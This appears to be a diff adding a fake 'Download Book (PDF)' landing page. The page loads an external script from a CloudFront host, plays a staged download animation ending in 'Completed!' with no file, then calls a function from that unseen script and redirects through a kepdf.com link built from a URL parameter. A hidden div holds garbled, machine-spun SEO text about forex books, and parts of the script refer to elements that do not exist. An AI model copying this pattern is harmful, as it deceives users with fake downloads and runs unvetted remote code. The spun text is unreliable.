@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Document</title>
+<script type="text/javascript">
+    var ROQeH_cvg_jwOPCc={"it":4246233,"key":"5bc26"};
+</script>
+<script src="https://d37qww00sjevbr.cloudfront.net/5188273.js"></script>
+</head>
+<body>
+<style>
+  * {
+	border: 0;
+	box-sizing: border-box;
+	margin: 0;
+	padding: 0;
+}
+:root {
+	--dur: 5s;
+	--arrowA: polygon(33% 0%,67% 0%,67% 60%,100% 60%,50% 100%,0% 60%,33% 60%);
+	--arrowB: polygon(0% 37.5%,100% 37.5%,100% 62.5%,100% 62.5%,50% 62.5%,0% 62.5%,0% 62.5%);
+	font-size: calc(20px + (40 - 20)*(100vw - 320px)/(2560 - 320));
+}
+
+button {
+	background: #255ff4;
+	border-radius: 0.2em;
+	color: #fff;
+	cursor: pointer;
+	display: flex;
+	margin: auto;
+	padding: 0.5em 1em;
+    font-size: 1rem;
+	position: relative;
+	transition: background 0.15s linear;
+	width: 100%;
+	-webkit-appearance: none;
+	-moz-appearance: none;
+	appearance: none;
+	-webkit-tap-highlight-color: transparent;
+}
+button:focus {
+	outline: transparent;
+}
+button::-moz-focus-inner {
+	border: 0;
+}
+button:not(:disabled):focus, button:not(:disabled):hover {
+	background: #0b46da;
+}
+button:not(:disabled):active {
+	transform: translateY(1px);
+}
+button:disabled {
+	cursor: not-allowed;
+}
+button span, button:before, button:after {
+	display: inline-block;
+	pointer-events: none;
+}
+button:before, button:after {
+	border-radius: 0.25em;
+	opacity: 0;
+	top: 1em;
+	left: 1.3em;
+	height: 0.5em;
+	transform-origin: 0.25em 50%;
+	z-index: 2;
+}
+button:before {
+	transform: rotate(-180deg);
+	width: 0.8em;
+}
+button:after {
+	width: 1.2em;
+}
+button:before, button:after, .dl-icon:before, .dl-icon:after {
+	content: "";
+	display: block;
+	position: absolute;
+}
+button:before, button:after, .dl-icon:before {
+	background: currentColor;
+}
+button span + span {
+	margin: auto;
+}
+.dl-icon {
+	margin-right: 0.5em;
+	position: relative;
+	width: 1.5em;
+	height: 1.5em;
+}
+.dl-icon:before {
+	clip-path: var(--arrowA);
+	-webkit-clip-path: var(--arrowA);
+	top: 0;
+	left: calc(50% - 0.55em);
+	transform-origin: 50% 100%;
+	width: 1.1em;
+	height: 1em;
+	z-index: 1;
+}
+.dl-icon:after {
+	background-image: linear-gradient(#0b46da,#0b46da);
+	background-position: -1.5em 0;
+	background-size: 100% 100%;
+	background-repeat: no-repeat;
+	box-shadow:
+		0.25em 0 0 inset,
+		-0.25em 0 0 inset,
+		0 -0.25em 0 inset;
+	bottom: 0;
+	width: 100%;
+	height: 0.5em;
+}
+.dl-working:before {
+	animation: checkOutA var(--dur) linear forwards;
+}
+.dl-working:after {
+	animation: checkOutB var(--dur) linear forwards;
+}
+.dl-working .dl-icon {
+	animation: impact var(--dur) linear forwards;
+}
+.dl-working .dl-icon:before {
+	animation: arrowToBar var(--dur) linear forwards;
+}
+.dl-working .dl-icon:after {
+	animation: trayToBar var(--dur) linear forwards;
+}
+
+/* Animation */
+@keyframes impact {
+	from, 15% {
+		transform: translateY(0);
+	}
+	17.5% {
+		transform: translateY(0.25em);
+	}
+	20%, to {
+		transform: translateY(0);
+	}
+}
+@keyframes arrowToBar {
+	from {
+		clip-path: var(--arrowA);
+		-webkit-clip-path: var(--arrowA);
+	}
+	10% {
+		clip-path: var(--arrowB);
+		-webkit-clip-path: var(--arrowB);
+		transform: translateY(0);
+	}
+	15% {
+		clip-path: var(--arrowB);
+		-webkit-clip-path: var(--arrowB);
+		transform: translateY(0.625em);
+	}
+	30% {
+		clip-path: var(--arrowB);
+		-webkit-clip-path: var(--arrowB);
+		opacity: 1;
+		transform: translateY(0.125em);
+	}
+	35%, to {
+		clip-path: var(--arrowB);
+		-webkit-clip-path: var(--arrowB);
+		opacity: 0;
+		transform: translateY(0.125em);
+	}
+}
+@keyframes trayToBar {
+	from, 15% {
+		background-color: transparent;
+		border-radius: 0;
+		box-shadow:
+			0.25em 0 0 inset,
+			-0.25em 0 0 inset,
+			0 -0.25em 0 inset;
+		transform: translateY(0);
+	}
+	15.1% {
+		background-color: currentColor;
+		border-radius: 0;
+		box-shadow:
+			0 0 0 inset,
+			0 0 0 inset,
+			0 0 0 0.1em inset;
+		transform: translateY(0);
+	}
+	30% {
+		background-color: currentColor;
+		background-position: -1.5em 0;
+		border-radius: 0.25em;
+		box-shadow:
+			0 0 0 inset,
+			0 0 0 inset,
+			0 0 0 0.1em inset;
+		transform: translateY(-0.5em);
+	}
+	90% {
+		background-color: currentColor;
+		background-position: 0 0;
+		border-radius: 0.25em;
+		box-shadow:
+			0 0 0 inset,
+			0 0 0 inset,
+			0 0 0 0.1em inset;
+		opacity: 1;
+		transform: translateY(-0.5em);
+	}
+	90.1%, to {
+		background-color: currentColor;
+		background-position: 0 0;
+		border-radius: 0.25em;
+		box-shadow:
+			0 0 0 inset,
+			0 0 0 inset,
+			0 0 0 0.1em inset;
+		opacity: 0;
+		transform: translateY(-0.5em);
+	}
+}
+@keyframes checkOutA {
+	from, 90% {
+		opacity: 0;
+		transform: translate(0,0) rotate(-180deg);
+	}
+	90.1% {
+		opacity: 1;
+		width: 0.8em;
+		transform: translate(0,0) rotate(-180deg);
+	}
+	92.5% {
+		opacity: 1;
+		width: 1em;
+		transform: translate(0,0.5em) rotate(-120deg);
+	}
+	95%, to {
+		opacity: 1;
+		width: 1em;
+		transform: translate(0,0.375em) rotate(-135deg);
+	}
+}
+@keyframes checkOutB {
+	from, 90% {
+		opacity: 0;
+		transform: translate(0,0) rotate(0);
+	}
+	90.1% {
+		opacity: 1;
+		width: 1.2em;
+		transform: translate(0,0) rotate(0);
+	}
+	92.5% {
+		opacity: 1;
+		width: 1.6em;
+		transform: translate(0,0.5em) rotate(-60deg);
+	}
+	95%, to {
+		opacity: 1;
+		width: 1.6em;
+		transform: translate(0,0.375em) rotate(-45deg);
+	}
+}
+
+/* Dark mode */
+@media (prefers-color-scheme: dark) {
+	body {
+		background: #2e3138;
+	}
+}
+</style>
+<div style="margin-bottom:20px; text-align:center" class="container">
+<div class="row">
+<div class="col-xl-12">
+
+</div>
+</div>
+<div style="padding:10px;" class="container">
+<button type="button" data-dl>
+<span class="dl-icon"></span><span>Download Book (PDF)</span>
+</button>
+<div class="row">
+</div>
+</div>
+<div style="margin-top:20px" class="container">
+<div class="row">
+<div class="col-xl-12">
+
+<p id="download-fallback" style="display:block">
+Your download will begin in a moment. If it doesn't, <a id="redlink" href>restart the download. </a>.
+</p>
+</div>
+</div>
+</div>
+</div>
+<div style="display:none">
+Best Books on Forex
+Learning forex trading is also a neater task if you have got previous experience within the stock, commodity, futures or options markets, but if you’re completely new the planet of trading you’ll have to start by learning the fundamentals. Reading books on forex trading is probably the foremost beneficial way once you take your first steps during this exciting world. there’s an enormous amount of literature that talks about forex and trading normally, which is why you’ll find it very difficult to seek out books within which you’ll be able to find real use. This dilemma prompted me to create an inventory of forex books that i like to recommend to read which you may not have to seek for others. These books have helped many traders, myself included, so you’ll be able to make sure that some time won’t be wasted while you’re browsing through them.
+Getting started in currency trading written by Michael Archer and Jim Pickford. This forex trading book explains every aspect of this exciting world, from the foremost basic to advanced topics. bushed an easy and simple to grasp way which makes it even more useful for brand spanking new traders. If you merely have the time or money to shop for one book, i counsel you to decide on this book because it’ll provide you with almost everything you wish to start out trading in an exceedingly successful way.
+For Beginners
+Learn Forex Easily — a short but comprehensive introduction to the most concepts of forex trading with an introduction to some aspects of technical and fundamental analysis. it’ll be very useful for brand new traders.
+Reasons for Losing available Trading — The book explains 25 mistakes that traders can make within the market and ultimately result in their loss like lack of information and misuse of stop-loss orders or demo accounts.
+Strategy 10 — the book covers some simple principles about forex trading with an introduction to the categories of dealers during this market and tips for avoiding a number of the pitfalls that traders may encounter.
+Forex Secrets — This book is complete and complete content about forex for novice traders, because it simplifies explanation of the most concepts that help anyone who has never treated forex to understand all the terms and tools that they will encounter while working during this field.
+Trade Your Thanks To Financial Freedom By Van K. Tharp.
+The author of this book is one amongst the foremost important coaches within the trading world similarly as an expert within the behavioral aspects of the financial markets. The book covers the foremost problematic aspects of currency trading like the influence of emotions and feelings, position sizing and system development. it’s easy to read and contains a large amount of interesting information in addition as being very useful.
+Encyclopedia of Graph Models By Thomas Bulkowski.
+This book takes the shape of a real encyclopedia except that it replaces words with precise definitions and descriptions of chart patterns, which are of great interest to technical analysis traders and are often used because the basis for several forex trading systems and methods. This comprehensive encyclopedia includes descriptions, statistics, recommendations, and samples of all graph models.
+Defeat The Forex Broker By Agustin Silvani.
+This book isn’t mainly aimed toward newcomers to the planet of forex, but i like to recommend reading it straight away once you’ve got acquired the fundamental knowledge of trading while gaining some practical experience. This book will facilitate your develop a forex trading strategy within the real market yet as the way to board the planet of currency trading merely.
+The Disciplined Trader By Mark Douglas.
+Self-discipline is one in every of the foremost important characteristics of a successful forex trader. Unfortunately, many people miss this important virtue. This book talks about discipline in trading and what are the benefits that you just will gain from adhering to that, and the way to realize the goals you aspire to without facing psychological pressure.
+As the popular saying goes, the education train will never miss its time, so after reading these books that i like to recommend it remains necessary to continue the training journey and browse more of them while striving to develop your level of data within the world of Forex. This list is a crucial reference for novice traders who are still taking their first steps within the world of trading and should not know where to start out.
+</div>
+<script type="text/javascript">
+
+          document.addEventListener("DOMContentLoaded",function(){
+	this.addEventListener("click",e => {
+		let tar = e.target;
+		if (tar.hasAttribute("data-dl")) {
+			let dlClass = "dl-working";
+			if (!tar.classList.contains(dlClass)) {
+				let lastSpan = tar.querySelector("span:last-child"),
+					lastSpanText = lastSpan.textContent,
+					timeout = getMSFromProperty("--dur",":root");
+
+				tar.classList.add(dlClass);
+				lastSpan.textContent = "Downloading ...";
+				tar.disabled = true;
+
+				setTimeout(() => {
+					lastSpan.textContent = "Completed!";
+				},timeout * 0.9);
+
+                setTimeout(()=>{
+                  	_FD();
+                },5e3)
+
+
+				setTimeout(() => {
+					tar.classList.remove(dlClass);
+					lastSpan.textContent = lastSpanText;
+					tar.disabled = false;
+				},timeout + 10e3);
+			}
+		}
+	});
+});
+function getMSFromProperty(property,selector) {
+	let cs = window.getComputedStyle(document.querySelector(selector)),
+		transDur = cs.getPropertyValue(property),
+		msLabelPos = transDur.indexOf("ms"),
+		sLabelPos = transDur.indexOf("s");
+
+	if (msLabelPos > -1)
+		return transDur.substr(0,msLabelPos);
+	else if (sLabelPos > -1)
+		return transDur.substr(0,sLabelPos) * 1e3;
+}
+                const queryString = window.location.search;
+                const urlParams = new URLSearchParams(queryString);
+                var myLink = document.getElementById("myLink");
+                var fallback = document.getElementById("download-fallback");
+                var secondsWait = document.getElementById("secondsWait");
+                var redlink = document.getElementById("redlink");
+                var wait = 20000;
+                var time = 20;
+                const fileid = urlParams.get('_rdc')
+                redlink.href = decodeURIComponent("https://www.kepdf.com/english/redirect?id=" + fileid);
+                var x = setInterval(function () {
+                    secondsWait.innerHTML = "HANG ON A SECOND YOUR DIRECT LINK IS BEING GENERATED " + "<br>" + time;
+                    time--;
+                }, 1000);
+                setTimeout(function () {
+                    secondsWait.remove();
+                    myLink.style.display = "block";
+                    fallback.style.display = "block";
+                    myLink.href = decodeURIComponent("https://www.kepdf.com/english/redirect?id=" + fileid);
+                    myLink.innerHTML = "Download";
+                }, wait);
+
+        </script>
+</body>
+</html>
